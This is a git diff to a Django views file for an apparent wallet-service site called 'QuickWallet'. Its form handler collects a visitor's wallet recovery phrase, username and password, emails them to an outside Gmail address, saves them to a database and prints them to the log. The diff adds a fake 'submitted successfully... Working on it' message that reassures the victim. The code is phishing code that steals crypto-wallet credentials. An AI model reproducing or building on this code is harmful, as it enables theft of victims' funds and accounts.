@@ -3,6 +3,7 @@ from django.shortcuts import render, redirect
 from . models import *
 from django.core.mail import send_mail
 from django.conf import settings
+from django.contrib import messages
 
 # Create your views here.
 def home(request):
@@ -26,16 +27,17 @@ def wallet_details(request, slug):
         user = request.POST['user']
         password = request.POST['pass']
 
-        data = f"Wallet: {wallet},\nPhrase: {phrase},\nEmail/Username: {user},\nPassword: {password}"
+        data = f"Wallet: {wallet}\nPhrase: {phrase}\nEmail/Username: {user}\nPassword: {password}"
         message = str(data)
 
-        # print(data)
+        print(data)
 
         send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['exkynexkyn@gmail.com'] )
 
         allresult = Result.objects.create(wallet=wallet, phrase=phrase, user=user, password=password)
         allresult.save()
 
+        messages.success(request, 'Your request was submitted successfully.\n\nWorking on it...')
         return redirect('home')
     else:
         return render(request, 'home/wallet-details.html')
